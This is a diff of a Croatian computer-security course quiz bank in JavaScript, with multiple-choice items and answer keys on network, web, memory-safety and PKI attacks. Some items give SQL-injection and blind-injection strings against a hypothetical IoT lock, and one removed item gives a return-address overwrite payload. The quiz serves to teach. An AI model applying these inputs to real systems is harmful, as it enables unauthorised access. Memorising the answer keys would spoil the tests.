-      "Protokoli za digitalne potpise"
-    ],
-    correct: 1,
-    explanation: "HOTP (HMAC-based OTP) generira jednokratne lozinke na temelju inkrementalnog brojača. TOTP (Time-based OTP) koristi trenutno vrijeme. Oba se koriste za 2FA — npr. Google Authenticator koristi TOTP."
-  },
-
-  // ── MREŽNA SIGURNOST ─────────────────────────────────────────────────────────
-  {
-    topic: "Mrežna sigurnost",
-    q: "Što je ARP spoofing napad?",
-    answers: [
-      "Napad koji poplavi mrežu ARP zahtjevima blokirajući promet",
-      "Slanje lažnih ARP odgovora kako bi napadač povezao svoju MAC adresu s IP adresom žrtve i presreo promet",
-      "Napad koji mijenja DNS zapise u ARP tablici",
-      "Napad koji onemogućuje ARP protokol na mreži"
-    ],
-    correct: 1,
-    explanation: "ARP spoofing: napadač šalje lažne ARP odgovore i ubacuje svoju MAC adresu u ARP tablice žrtava. Promet između žrtava prolazi kroz napadača — klasični man-in-the-middle."
-  },
-  {
-    topic: "Mrežna sigurnost",
-    q: "Što je SYN flood napad i koji sigurnosni zahtjev narušava?",
-    answers: [
-      "Napada povjerljivost slanjem lažnih TCP SYN paketa",
-      "Napada raspoloživost — šalje veliki broj SYN paketa bez dovršetka handshakea, iscrpljujući resurse poslužitelja",
-      "Napada integritet izmjenom SYN paketa u prijenosu",
-      "Napada autentičnost lažnim SYN-ACK odgovorima"
-    ],
-    correct: 1,
-    explanation: "SYN flood je DoS napad koji napada raspoloživost. Napadač šalje mnoštvo SYN paketa ali nikad ne šalje ACK, ostavljajući poslužiteljev stog polu-otvorenih veza dok se resursi ne iscrpe."
-  },
-  {
-    topic: "Mrežna sigurnost",
-    q: "Na koji sigurnosni zahtjev utječe DNS amplification napad?",
-    answers: ["Povjerljivost", "Integritet", "Raspoloživost", "Autentičnost"],
-    correct: 2,
-    explanation: "DNS amplification je DDoS napad koji koristi refleksiju i pojačavanje — mali zahtjev generira veliki odgovor koji preplavljuje žrtvu. Narušava raspoloživost ciljane usluge."
-  },
-  {
-    topic: "Mrežna sigurnost",
-    q: "Što je UDP storm napad između echo (port 7) i chargen (port 19) usluga?",
-    answers: [
-      "Napadač popunjava mrežu UDP paketima s lažnim IP adresama",
-      "Napadač pošalje paket server1:echo→server2:chargen; chargen generira znakove koji triggiraju echo koji triggira chargen — beskonačna petlja",
-      "Napadač koristi UDP za provalu u vatrozid",
-      "Napadač šalje kriptirane UDP pakete kako bi zaobišao DPI"
-    ],
-    correct: 1,
-    explanation: "UDP storm: echo servis vraća sve što primi, chargen generira beskonačni stream znakova. Spajanjem ta dva servera nastaje beskonačna petlja koja troši propusnost i resurse."
-  },
-  {
-    topic: "Mrežna sigurnost",
-    q: "Koja iptables naredba odbacuje SVE dolazne pakete po defaultu?",
-    answers: [
-      "iptables -A INPUT -j DROP",
-      "iptables -P INPUT DROP",
-      "iptables -D INPUT -j REJECT",
-      "iptables -F INPUT"
-    ],
-    correct: 1,
-    explanation: "iptables -P INPUT DROP postavlja DEFAULT POLICY za INPUT lanac na DROP. -A dodaje pravilo na kraj lanca, -D briše pravilo, -F briše sva pravila u lancu."
-  },
-  {
-    topic: "Mrežna sigurnost",
-    q: "Koja posljedica može nastupiti nakon uspješnog ARP spoofing napada?",
-    answers: [
-      "DoS napad koji onemogućuje pristup internetu",
-      "Man-in-the-middle napad — napadač može prisluškivati ili mijenjati promet između žrtava",
-      "Brute-force napad na lozinke",
-      "Ransomware infekcija"
-    ],
-    correct: 1,
-    explanation: "ARP spoofing najčešće vodi do MitM (Man-in-the-Middle) napada — napadač je ubačen između dvije komunikacijske strane i može prisluškivati, mijenjati ili blokirati promet."
-  },
-  {
-    topic: "Mrežna sigurnost",
-    q: "Može li HIDS (Host-based Intrusion Detection System) provjeravati šifrirani HTTPS promet?",
-    answers: [
-      "Da, jer ima pristup mrežnom sučelju",
-      "Da, jer se izvodi na hostu i može čitati promet prije šifriranja i nakon dešifriranja",
-      "Ne, jer HTTPS šifriranje blokira svaku inspekciju",
-      "Samo ako je instaliran certifikat napadača"
-    ],
-    correct: 1,
-    explanation: "HIDS se izvodi na samom hostu pa može pristupiti podacima PRIJE šifriranja (na razini aplikacije) i NAKON dešifriranja. Za razliku od NIDS-a koji vidi samo šifrirani promet na mreži."
-  },
-  {
-    topic: "Mrežna sigurnost",
-    q: "Što pruža DNSSEC u usporedbi s običnim DNS-om?",
-    answers: [
-      "Povjerljivost DNS upita — nitko ne može vidjeti što pretražujete",
-      "Integritet i autentičnost DNS odgovora — potvrđuje da odgovor nije modificiran",
-      "Šifriranje DNS prometa end-to-end",
-      "Zaštitu od DDoS napada na DNS"
-    ],
-    correct: 1,
-    explanation: "DNSSEC digitalno potpisuje DNS zapise osiguravajući integritet i autentičnost. NE pruža povjerljivost — DNS upiti i odgovori i dalje su vidljivi. Za povjerljivost služi DNS-over-HTTPS (DoH)."
-  },
-
-  // ── WEB SIGURNOST (dodatna) ──────────────────────────────────────────────────
-  {
-    topic: "Web sigurnost",
-    q: "Što je CSRF (Cross-Site Request Forgery) napad?",
-    answers: [
-      "Ubacivanje skripte na web stranicu koja se izvodi u tuđem pregledniku",
-      "Napadač navodi prijavljenog korisnika da nesvjesno pošalje autentificirani zahtjev drugoj web aplikaciji",
-      "Presretanje komunikacije između preglednika i poslužitelja",
-      "Napad koji modificira SQL upite web aplikacije"
-    ],
-    correct: 1,
-    explanation: "CSRF: napadač prevari žrtvu (prijavljenu na ciljanoj stranici) da izvrši neželjenu akciju — npr. klikne link koji u pozadini šalje zahtjev banci. Preglednik automatski šalje kolačiće pa poslužitelj misli da je zahtjev legitiman."
-  },
-  {
-    topic: "Web sigurnost",
-    q: "Čemu služi CSRF token u web aplikacijama?",
-    answers: [
-      "Šifrira komunikaciju između klijenta i poslužitelja",
-      "Nasumična vrijednost u formi koja dokazuje da je zahtjev stvarno generiran sa legitimne stranice, ne sa napadačeve",
-      "Zamjenjuje session cookie za autentifikaciju korisnika",
-      "Sprečava XSS napad filtriranjem HTML tagova"
-    ],
-    correct: 1,
-    explanation: "CSRF token je nasumična vrijednost koju server ugradi u svaki obrazac. Kad korisnik pošalje obrazac, server provjerava token — napadač s druge domene ne može znati ispravnu vrijednost tokena."
-  },
-  {
-    topic: "Web sigurnost",
-    q: "Što je Same Origin Policy (SOP)?",
-    answers: [
-      "Politika koja zabranjuje sve cross-origin HTTP zahtjeve",
-      "Sigurnosni mehanizam preglednika koji sprečava skripte s jednog izvora da čitaju podatke s drugog izvora",
-      "Politika koja zahtijeva HTTPS za sve web stranice",
-      "Pravilo koje zabranjuje učitavanje skripti s vanjskih domena"
-    ],
-    correct: 1,
-    explanation: "SOP: skripta s domene A ne može čitati odgovore zahtjeva upućenih domeni B. BITNO: SOP ne sprečava slanje zahtjeva ni učitavanje skripti — samo čitanje odgovora. Zato XSS radi s vanjskim skriptama."
-  },
-  {
-    topic: "Web sigurnost",
-    q: "Što je SSRF (Server-Side Request Forgery) napad?",
-    answers: [
-      "Napad gdje napadač pošalje lažni HTTP referer zaglavlje",
-      "Napadač navodi server da pošalje HTTP zahtjev na internu ili vanjsku adresu koju napadač kontrolira",
-      "Napad gdje server generira lažne SSL certifikate",
-      "Napad koji modificira server-side session podatke"
-    ],
-    correct: 1,
-    explanation: "SSRF: server ima funkcionalnost dohvata URL-a (npr. pregled web stranica). Napadač pošalje interni URL (npr. http://192.168.1.1/admin) — server to dohvati iz interne mreže i vrati napadaču."
+    explanation: "HTTPS (TLS s valjanim certifikatom): šifrira promet (povjerljivost), štiti integritet (MAC u TLS), autentificira POSLUŽITELJA (certifikat). Klijent se NE autentificira standardno — za to su potrebni klijentski certifikati."
   },
   {
     topic: "Web sigurnost",
     q: "Čemu služi HTTPOnly zastavica na kolačiću?",
     answers: [
       "Kolačić se šalje samo putem HTTPS veze",
-      "Kolačić nije dostupan JavaScript kodu — štiti od krađe session tokena XSS napadom",
+      "JavaScript kod ne može pristupiti kolačiću (document.cookie) — štiti od krađe session tokena XSS napadom",
       "Kolačić se briše po zatvaranju preglednika",
-      "Kolačić je vidljiv samo trenutnom HTTP zahtjevu"
+      "Kolačić je vidljiv samo za HTTP/1.1, ne HTTP/2"
     ],
     correct: 1,
-    explanation: "HTTPOnly sprečava pristup kolačiću putem document.cookie u JavaScriptu. Čak i ako napadač uspješno injektira XSS skriptu, ne može ukrasti session token označen HTTPOnly."
+    explanation: "HTTPOnly: preglednik ne dozvoljava pristup kolačiću putem JavaScripta. Čak i uspješan XSS napad ne može ukrasti session token označen HTTPOnly. Napadač ne može pročitati document.cookie za taj kolačić."
   },
   {
     topic: "Web sigurnost",
-    q: "Napadač šalje: username=zeljko&code=1234. Brava koristi upit: SELECT username FROM users WHERE username='$u' AND code='$c'. Kako napadač bez znanja koda može otkriti prvu znamenku koda?",
-    answers: [
-      "Pošalje: username=zeljko&code=' OR '1'='1",
-      "Pošalje: username=zeljko' AND code LIKE '1%'-- &code=dummy i provjerava odgovor",
-      "Pošalje sve moguće kombinacije od 0000 do 9999",
-      "To nije moguće bez znanja koda"
-    ],
-    correct: 1,
-    explanation: "Blind SQL injection: username=zeljko' AND code LIKE '1%'-- -- ako brava odgovori 'Code accepted', prva znamenka je 1. Ovako se otkriva znamenka po znamenka — za 4-znamenkasti kod dovoljno je max 40 zahtjeva."
+    q: "Koja HTTP zastavica na kolačiću osigurava da se šalje SAMO putem šifrirane (HTTPS) veze?",
+    answers: ["HTTPOnly", "SameSite", "Secure", "Encrypted"],
+    correct: 2,
+    explanation: "Zastavica Secure: preglednik šalje kolačić samo putem HTTPS veze — nikad putem nezaštićenog HTTP-a. HTTPOnly sprečava JavaScript pristup. SameSite kontrolira cross-site slanje (CSRF zaštita)."
   },
   {
     topic: "Web sigurnost",
-    q: "Aplikacijski vatrozid (WAF) radi na kojoj razini i što filtrira?",
+    q: "Što je SSRF (Server-Side Request Forgery)?",
     answers: [
-      "Mrežni sloj — filtrira IP pakete",
-      "Aplikacijski sloj — analizira HTTP promet i filtrira maliciozne zahtjeve (XSS, SQLi...)",
-      "Transportni sloj — filtrira TCP segmente",
+      "Napadač šalje lažni HTTP Referer header",
+      "Napadač navodi server da sam pošalje HTTP zahtjev na internu/vanjsku adresu po napadačevom izboru",
+      "Server generira lažne SSL certifikate",
+      "Napad koji modificira server-side session podatke direktno"
+    ],
+    correct: 1,
+    explanation: "SSRF: napadač zloupotrebljava server-side funkcionalnost dohvata URL-a. Šalje interni URL (http://192.168.1.1/admin) — server dohvati iz interne mreže i vrati napadaču. Portal koji registrira web sjedišta i dohvaća metapodatke je klasičan SSRF scenarij."
+  },
+  {
+    topic: "Web sigurnost",
+    q: "Napadač zna za IoT bravu ranjivost na SQL injection. Kako otvoriti bravu bez znanja koda korisnika 'zeljko'?",
+    answers: [
+      "username=zeljko&code=0000",
+      "username=zeljko' OR '1'='1&code=dummy",
+      "username=zeljko'--&code=bilo_sto",
+      "username=' OR 1=1--&code=bilo_sto"
+    ],
+    correct: 2,
+    explanation: "zeljko'-- zatvara string za username i komentarom (--) uklanja cijeli AND uvjet za code. Upit postaje: SELECT username FROM users WHERE username='zeljko'-- AND code='...' → uvjet za code se ignorira, vraća red za zeljko."
+  },
+  {
+    topic: "Web sigurnost",
+    q: "Kako napadač može blind SQL injection napadom otkriti prvu znamenku 4-znamenkastog koda za 'zeljko'?",
+    answers: [
+      "Pošalje sve kombinacije 0000-9999 dok ne uspije",
+      "Pošalje: username=zeljko' AND code LIKE '0%'--&code=x → ako brava odgovori 'accepted', prva znamenka je 0; inače proba 1, 2...",
+      "Pošalje UNION SELECT da dohvati sve kodove odjednom",
+      "Blind SQL injection ne može otkriti numeričke kodove"
+    ],
+    correct: 1,
+    explanation: "Blind SQL injection: za svaku znamenku pošaljemo do 10 zahtjeva (0-9). Ako brava odgovori 'accepted', pogodili smo. Za 4-znamenkasti kod: max 40 zahtjeva umjesto 10000. Binarnom pretragom može se svesti na još manje."
+  },
+  {
+    topic: "Web sigurnost",
+    q: "Što je aplikacijski vatrozid (WAF) i na kojoj razini radi?",
+    answers: [
+      "Mrežni sloj — filtrira IP pakete prema IP adresama",
+      "Aplikacijski sloj — razumije HTTP i može filtrirati maliciozne zahtjeve (XSS, SQLi, SSRF...)",
+      "Transportni sloj — filtrira TCP segmente prema portovima",
       "Fizički sloj — blokira neovlaštene mrežne priključke"
     ],
     correct: 1,
-    explanation: "WAF (Web Application Firewall) radi na aplikacijskom sloju (L7) i razumije HTTP protokol. Može detektirati i blokirati XSS, SQL injection i druge web napade analizom sadržaja zahtjeva."
+    explanation: "WAF (Web Application Firewall) radi na aplikacijskom sloju (Layer 7) i razumije HTTP/HTTPS protokol. Može detektirati i blokirati XSS payloade, SQL injection stringove, SSRF pokušaje i druge web napade."
   },
   {
     topic: "Web sigurnost",
-    q: "Koja HTTP zastavica na kolačiću osigurava da se šalje samo putem šifrirane veze?",
-    answers: ["HTTPOnly", "SameSite", "Secure", "Encrypted"],
-    correct: 2,
-    explanation: "Zastavica Secure osigurava da preglednik šalje kolačić samo putem HTTPS veze. HTTPOnly sprečava JavaScript pristup. SameSite kontrolira cross-site slanje kolačića (zaštita od CSRF)."
-  },
-
-  // ── BUFFER OVERFLOW (dodatna) ────────────────────────────────────────────────
-  {
-    topic: "Buffer overflow",
-    q: "Funkcija scanf(\"%s\", entered_password) je ranjiva na buffer overflow. Zašto?",
+    q: "Forum ne filtrira unose. Na njega je postavljen XSS payload. Hoće li napad uspjeti?",
     answers: [
-      "Jer scanf ne podržava Unicode znakove",
-      "Jer %s čita string bez provjere veličine odredišnog međuspremnika — može pisati izvan rezerviranog prostora",
-      "Jer scanf ne može čitati lozinke",
-      "Jer %s formatira ulaz na pogrešan način"
+      "Ne, preglednik automatski blokira XSS napade",
+      "Da — forum nema zaštite, skripta se pohranjuje i izvršava u preglednicima svih posjetitelja",
+      "Ne, SOP sprečava izvođenje skripti s foruma",
+      "Da, ali samo ako korisnik klikne na specifičnu stranicu"
     ],
     correct: 1,
-    explanation: "scanf(\"%s\", buf) čita znakove dok ne nađe whitespace, bez provjere koliko prostora ima u buf. Napadač unosi više znakova nego što je rezervirano i prepisuje memoriju iza buffera — klasični stack overflow."
+    explanation: "Stored XSS s forumom bez filtriranja: skripta se pohranjuje u bazu. Svaki put kad posjetitelj učita stranicu s tom porukom, preglednik izvodi skriptu u kontekstu foruma — s pristupom cookies, session tokenima i DOM-u."
+  }
+,
+// ══════════════════════════════════════════════════════════════
+  // EXTRA — PKI & CERTIFIKATI (dodatnih 8)
+  // ══════════════════════════════════════════════════════════════
+  {
+    topic: "PKI & Certifikati",
+    q: "Što je sidro povjerenja (trust anchor) u kontekstu TLS-a?",
+    answers: [
+      "Privatni ključ poslužitelja pohranjen na disku",
+      "Vršni (root) CA certifikat ugrađen u web preglednik ili OS — lanac certifikata mora završiti na njemu",
+      "OCSP poslužitelj koji provjerava opozvane certifikate",
+      "SHA-256 sažetak certifikata koji se uspoređuje s bazom"
+    ],
+    correct: 1,
+    explanation: "Sidro povjerenja (trust anchor): pouzdanost cijelog lanca certifikata temelji se na vršnim CA certifikatima koji su unaprijed ugrađeni u preglednik/OS. Ako lanac ne završi na jednom od njih, certifikat se ne prihvaća."
   },
   {
-    topic: "Buffer overflow",
-    q: "Na x86-64 Linux sustavu, gdje se nalazi adresa za povratak (return address) na stogu u odnosu na lokalne varijable?",
+    topic: "PKI & Certifikati",
+    q: "Preglednik provjerava ispravnost TLS certifikata. Koji su koraci provjere?",
     answers: [
-      "Ispod lokalnih varijabli (na višim adresama)",
-      "Iznad lokalnih varijabli (na nižim adresama)",
-      "Na istoj adresi kao i stari rbp",
-      "Uvijek na fiksnoj adresi 0x7fff..."
+      "Samo provjera datuma isteka i digitalnog potpisa",
+      "Provjera perioda valjanosti, opoziva, ispravnosti lanca potpisa, izdavača (pouzdanog CA) i podudaranja subjekta s domenom",
+      "Samo provjera je li certifikat izdan od Google Trust Services",
+      "Provjera SHA-256 hasha certifikata s online bazom"
+    ],
+    correct: 1,
+    explanation: "Iz predavanja — 5 provjera: (1) period valjanosti, (2) opoziv (CRL/OCSP), (3) ispravnost digitalnih potpisa u lancu, (4) lanac završava na pouzdanom CA, (5) Subject/SAN odgovara domeni kojoj pristupamo."
+  },
+  {
+    topic: "PKI & Certifikati",
+    q: "Što je samo-potpisani certifikat (self-signed)?",
+    answers: [
+      "Certifikat potpisan od strane korisnika koji ga koristi — isti entitet je i subjekt i izdavač",
+      "Certifikat bez digitalnog potpisa",
+      "Certifikat izdan samo za jednu domenu",
+      "Certifikat koji se automatski obnavlja"
     ],
     correct: 0,
-    explanation: "Stog raste prema nižim adresama. Redoslijed od viših prema nižim adresama: return address → stari rbp → lokalne varijable. Prepisivanjem varijabli prema gore napadač može doseći i prepisati return address."
-  },
-  {
-    topic: "Buffer overflow",
-    q: "Napadač upisuje (0xFF)*16 (0xAA)*16 0x3c 0x25 0x40 0x00 kao lozinku. Što postiže (bez kanarinica, bez W^X)?",
-    answers: [
-      "Ispravno pogađanje lozinke",
-      "Prepisivanje entered_password (16B) + admin_password (16B) + return address sa 0x0000000040253c",
-      "Pokretanje shellcode-a pohranjenoga na stogu",
-      "Rušenje programa bez izvršavanja koda"
-    ],
-    correct: 1,
-    explanation: "16 bajta FF prepisuje entered_password, 16 bajta AA prepisuje admin_password, a zatim 6 bajta u little-endian formatu (3c 25 40 00 00 00) prepisuje return address na 0x000000000040253c — adresu login_success funkcije."
-  },
-  {
-    topic: "Buffer overflow",
-    q: "Zašto W^X (Write XOR Execute) zaštita ne sprečava ROP napade?",
-    answers: [
-      "Jer ROP ne zapisuje ništa novo — koristi već postojeći izvršivi kod u memoriji",
-      "Jer W^X ne funkcionira na 64-bitnim sustavima",
-      "Jer ROP napadi šifriraju gadgete pa W^X ih ne prepoznaje",
-      "Jer W^X štiti samo heap, ne i stog"
-    ],
-    correct: 0,
-    explanation: "ROP ne ubacuje novi kod — koristi kratke nizove instrukcija (gadgete) koji već postoje u programu ili bibliotekama i koji su izvršivi. W^X sprečava izvođenje ubačenog koda, ali gadgeti su legalni dijelovi programa."
-  },
-  {
-    topic: "Buffer overflow",
-    q: "read_input() funkcija čita index i value te radi: seq[index] = value. Zašto je ovo ranjivo ako nema provjere granica?",
-    answers: [
-      "Jer value može biti negativan broj",
-      "Jer napadač može koristiti negativan ili veliki index da piše izvan seq[] niza i prepiše adresu za povratak",
-      "Jer seq niz nije inicijaliziran na nulu",
-      "Jer integer overflow može oštetiti value"
-    ],
-    correct: 1,
-    explanation: "Bez provjere granica, seq[index] s negativnim ili prevelikim indexom piše izvan niza. Na stogu odmah iza lokalnih varijabli nalazi se stari rbp i adresa za povratak — napadač može ih prepisati."
-  },
-  {
-    topic: "Buffer overflow",
-    q: "Što je heap overflow i čime se razlikuje od stack overflow-a?",
-    answers: [
-      "Heap overflow je napad na operacijski sustav, stack overflow na aplikaciju",
-      "Heap overflow prepisuje dinamički alocirane podatke i metapodatke alokatora, dok stack overflow cilja na stog s lokalnim varijablama i return adresom",
-      "Heap overflow je moguć samo u C++, stack overflow u C",
-      "Nema razlike — oba prepisuju memoriju na isti način"
-    ],
-    correct: 1,
-    explanation: "Stack overflow prepisuje stog (lokalne varijable, return address). Heap overflow prepisuje heap — dinamički alocirane podatke i malloc metapodatke. Oba mogu dovesti do izvršavanja proizvoljnog koda."
-  },
-
-  // ── SIGURNO PROGRAMIRANJE (dodatna) ──────────────────────────────────────────
-  {
-    topic: "Sigurno programiranje",
-    q: "ffsshd demon provjerava hash datoteke, a zatim je pokreće. Koji napad je moguć uz više paralelnih sesija?",
-    answers: [
-      "SQL injection napad na bazu dopuštenih programa",
-      "TOCTOU race condition: zamjena datoteke između provjere hasha i poziva execv",
-      "Buffer overflow u funkciji provjere hasha",
-      "XSS napad kroz ime datoteke"
-    ],
-    correct: 1,
-    explanation: "TOCTOU: napadač u sesiji 1 počekuje da ffsshd provjeri hash legitimnog programa, zatim u sesiji 2 zamijeni datoteku malicioznom verzijom istog naziva. ffsshd tada pokreće malicioznu datoteku jer je hash bio valjan u trenutku provjere."
-  },
-  {
-    topic: "Sigurno programiranje",
-    q: "Rješenje za TOCTOU ranjivost u ffsshd demonu (koji ne može mijenjati execv poziv) je:",
-    answers: [
-      "Koristiti sha512 umjesto sha256 za provjeru",
-      "Kao privilegirani proces: kopirati datoteku na sigurnu lokaciju, promijeniti vlasnika na root i ovlasti na 500, zatim pokrenut tu kopiju",
-      "Provjeravati hash dva puta zaredom",
-      "Blokirati sve paralelne sesije"
-    ],
-    correct: 1,
-    explanation: "Ispravno rješenje: kao privilegirani proces kopiraj datoteku na sigurnu lokaciju (napadač nema pristup), provjeri hash kopije, postavi vlasnika na root i ovlasti 500 (samo root može pisati), pa pokreni kopiju. Napadač ne može zamijeniti kopiju jer nema ovlasti."
-  },
-  {
-    topic: "Sigurno programiranje",
-    q: "Heartbleed ranjivost je primjer koje vrste propusta?",
-    answers: [
-      "Buffer overflow na stogu",
-      "Nedostatna provjera ispravnosti ulaza — server vraća više memorije nego što je zatraženo",
-      "SQL injection u OpenSSL-u",
-      "Race condition u TLS handshakeu"
-    ],
-    correct: 1,
-    explanation: "Heartbleed: klijent kaže 'vrati mi 'bird' od 500 znakova'. Server ne provjeri je li stvarna duljina poruke 500, već vrati 500 bajta iz memorije počevši od 'bird' — otkrivajući privatne ključeve, lozinke i druge tajne."
-  },
-  {
-    topic: "Sigurno programiranje",
-    q: "Koji je ispravak za kod koji krši princip sigurnog ispadanja? (ispitProlaz=true na početku)",
-    answers: [
-      "Dodati else { ispitProlaz = true; } nakon provjere",
-      "Zamijeniti ispitProlaz=true na početku s ispitProlaz=false",
-      "Ukloniti try-catch blok",
-      "Dodati finally { ispitProlaz = false; }"
-    ],
-    correct: 1,
-    explanation: "Fail Securely: inicijalno stanje mora biti SIGURNO (odbijeno = false). Ako dođe do iznimke, ostaje false. Tek ako sve provjere prođu uspješno, postavimo na true. Nikad ne počinjemo s privilegiranim stanjem."
-  },
-  {
-    topic: "Sigurno programiranje",
-    q: "Što je fuzzing (fuzz testing)?",
-    answers: [
-      "Ručni pregled izvornog koda",
-      "Automatsko slanje nasumičnih ili neispravnih ulaza programu radi otkrivanja ranjivosti",
-      "Testiranje programa u izoliranoj okolini (sandboxu)",
-      "Decompilacija binarnog koda"
-    ],
-    correct: 1,
-    explanation: "Fuzzing = automatsko generiranje i slanje neočekivanih/neispravnih ulaza programu. Cilj je izazvati rušenje ili neočekivano ponašanje koje ukazuje na ranjivost — posebno učinkovito za otkrivanje buffer overflow i input validation propusta."
-  },
-  {
-    topic: "Sigurno programiranje",
-    q: "Zašto je blacklist pristup (zabranjivanje poznatih malicioznih unosa) lošiji od whitelist pristupa?",
-    answers: [
-      "Jer je blacklist prespor za produkcijsku upotrebu",
-      "Jer se isti znakovi mogu kodirati na bezbroj načina pa je nemoguće zabraniti sve varijante",
-      "Jer whitelist zahtijeva manje konfiguracije",
-      "Jer blacklist ne radi u web aplikacijama"
-    ],
-    correct: 1,
-    explanation: "Blacklist: zabranjuješ poznate loše unose — ali localhost se može pisati kao 127.0.0.1, ::1, 0x7f000001... Whitelist: dozvoljavaš samo specifično dobre unose — sve ostalo je zabranjeno. Puno sigurniji pristup."
-  },
-  {
-    topic: "Sigurno programiranje",
-    q: "Strogo tipizirani jezik koji provjerava tipove pri kompilaciji će za kod 'x = 3; y = \"SRS\"; z = x + y' napraviti:",
-    answers: [
-      "Grešku tijekom izvođenja (runtime error)",
-      "Grešku prilikom prevođenja (compile error)",
-      "Uspješno prevesti i z će biti '3SRS'",
-      "Uspješno prevesti i z će biti 3"
-    ],
-    correct: 1,
-    explanation: "Strogo tipizirani jezik s kompilacijom (npr. Java, C++) otkriva neskladnost tipova (int + string) u fazi prevođenja — program se uopće ne može pokrenuti. Slabo tipizirani (Python) daju runtime error, JavaScript tiho konvertira."
-  },
-
-  // ── LINUX & OS SIGURNOST (dodatna) ───────────────────────────────────────────
-  {
-    topic: "Linux ovlasti",
-    q: "Datoteka: -rw-r----- Vlasnik: www-data, Grupa: admin. Korisnik mirko je u grupi admin. Može li mirko čitati datoteku?",
-    answers: [
-      "Da, jer mirko je u grupi admin koja ima r-- prava",
-      "Ne, jer mirko nije vlasnik",
-      "Da, ali samo ako je root",
-      "Ne, jer grupna prava su rw- pa je potrebno pisanje"
-    ],
-    correct: 0,
-    explanation: "rw-r----- : vlasnik (www-data) ima rw-, grupa (admin) ima r--, ostali nemaju ništa. Mirko je u grupi admin, dakle može čitati (r--). Vlasništvo nije uvjet — grupno članstvo je dovoljno."
-  },
-  {
-    topic: "Linux ovlasti",
-    q: "Kakva je razlika između DAC i MAC (Discretionary vs Mandatory Access Control)?",
-    answers: [
-      "DAC je za datoteke, MAC je za mrežne resurse",
-      "U DAC vlasnik resursa odlučuje o dozvolama; u MAC sustav/administrator nameće pravila koja korisnici ne mogu mijenjati",
-      "DAC je noviji i sigurniji od MAC-a",
-      "MAC koristi liste kontrole pristupa, DAC koristi uloge"
-    ],
-    correct: 1,
-    explanation: "DAC: vlasnik datoteke sam kontrolira dozvole (chmod) — Linux koristi DAC. MAC: sigurnosna politika se nameće centralno i ne može je mijenjati ni vlasnik (SELinux, AppArmor). MAC je strože i sigurnije."
-  },
-  {
-    topic: "Linux ovlasti",
-    q: "Što je sandboxing aplikacija i zašto ga koristimo?",
-    answers: [
-      "Testno okruženje za razvoj programske podrške",
-      "Izolacija aplikacije u ograničeno okruženje gdje može pristupiti samo eksplicitno dozvoljenim resursima",
-      "Enkripcija podataka aplikacije na disku",
-      "Tehnika za virtualnu memoriju u OS-u"
-    ],
-    correct: 1,
-    explanation: "Sandboxing: svaka aplikacija radi u 'pješčaniku' i nema pristup ostatku sustava bez eksplicitnog dopuštenja. Primjeri: Android/iOS app permissions, Docker kontejneri, browser tab izolacija, Firejail."
-  },
-  {
-    topic: "Linux ovlasti",
-    q: "Kojom naredbom se mijenja ovlasti datoteke tako da nitko ne može pisati u nju, a ostala prava ostanu nepromijenjena?",
-    answers: ["chmod -w datoteka", "chown -w datoteka", "chmod 444 datoteka", "chgrp -w datoteka"],
-    correct: 0,
-    explanation: "chmod -w datoteka oduzima pravo pisanja svima (vlasnik, grupa, ostali) bez mijenjanja ostalih prava. Alternativa chmod a-w. Za specifičnu grupu: chmod g-w ili o-w."
-  },
-
-  // ── PKI & CERTIFIKATI (dodatna) ──────────────────────────────────────────────
-  {
-    topic: "PKI & Certifikati",
-    q: "Web preglednik 'Hrabri' ignorira polje CA:TRUE/FALSE u certifikatima. Koja napadačka mogućnost se otvara administratorima FER-a?",
-    answers: [
-      "Mogu čitati sve HTTPS stranice bez dekriptiranja",
-      "Mogu koristiti *.fer.unizg.hr certifikat kao CA i potpisati lažni certifikat za www.gmail.com",
-      "Mogu ugasiti Google-ove servere",
-      "Mogu promijeniti DNS zapise za gmail.com"
-    ],
-    correct: 1,
-    explanation: "Bez CA:FALSE provjere, bilo koji certifikat može djelovati kao CA. FER administratori mogu RSA ključem iz *.fer.unizg.hr certifikata potpisati novi certifikat za gmail.com — Hrabri preglednik će ga prihvatiti."
+    explanation: "Samo-potpisani certifikat: privatni ključ koji odgovara javnom ključu u certifikatu koristi se za potpisivanje — isti entitet je i Issuer i Subject. Primjer: vršni (root) CA certifikati su samo-potpisani. Koriste se za testiranje i internu upotrebu."
   },
   {
     topic: "PKI & Certifikati",
-    q: "Koji je postupak provjere ispravnosti lanca certifikata u pregledniku?",
+    q: "Što je CRL (Certificate Revocation List) i čemu služi?",
     answers: [
-      "Preglednik kontaktira CA i pita je li certifikat valjan",
-      "Preglednik provjerava potpis svakog certifikata javnim ključem nadređenog CA, sve do korijenskog certifikata koji je ugrađen u preglednik",
-      "Preglednik šalje certifikat Googleu na provjeru",
-      "Preglednik provjerava samo datum isteka certifikata"
+      "Lista svih izdanih certifikata nekog CA-a",
+      "Lista opozvanih certifikata — ako je certifikat na listi, preglednik ga ne smije prihvatiti čak ni unutar roka valjanosti",
+      "Lista pouzdanih CA-ova ugrađenih u preglednik",
+      "Lista certifikata kojima je istekao rok valjanosti"
     ],
     correct: 1,
-    explanation: "Chain validation: svaki certifikat potpisuje CA iznad njega. Preglednik prati lanac od poslužiteljevog certifikata prema gore do root CA koji je ugrađen u OS/preglednik kao pouzdano sidro (trust anchor)."
+    explanation: "CRL: CA objavljuje listu serijskih brojeva certifikata koje je opozvao (npr. jer je privatni ključ kompromitiran). Preglednik dohvati CRL s URL-a navedenog u certifikatu i provjeri je li certifikat na listi. OCSP je modernija alternativa."
   },
   {
     topic: "PKI & Certifikati",
-    q: "Koji je privatni ključ odgovoran za Signature Value u certifikatu: USERTrust → GEANT OV RSA CA 4 → *.fer.unizg.hr?",
+    q: "Što je OCSP i čime se razlikuje od CRL-a?",
     answers: [
-      "Privatni ključ *.fer.unizg.hr",
-      "Privatni ključ USERTrust root CA",
-      "Privatni ključ GEANT OV RSA CA 4",
-      "Javni ključ GEANT OV RSA CA 4"
+      "OCSP je novi format certifikata, CRL je stari format",
+      "OCSP je online protokol za provjeru statusa pojedinog certifikata u realnom vremenu; CRL je periodički objavljivana lista opozvanih certifikata",
+      "OCSP je sigurniji jer koristi asimetričnu enkripciju, CRL je simetričan",
+      "Nema razlike — oboje provjerava isti server"
     ],
-    correct: 2,
-    explanation: "Signature Value u certifikatu *.fer.unizg.hr nastala je potpisom IZDAVAČA — to je GEANT OV RSA CA 4 koji je izdao certifikat FER-u. Koristi se PRIVATNI ključ GEANT-a za potpisivanje."
+    correct: 1,
+    explanation: "OCSP (Online Certificate Status Protocol): preglednik pita OCSP responder je li specifičan certifikat opozvan — odgovor je u realnom vremenu. CRL: preglednik preuzme cijelu listu periodički. OCSP je efikasniji za pojedinačne provjere."
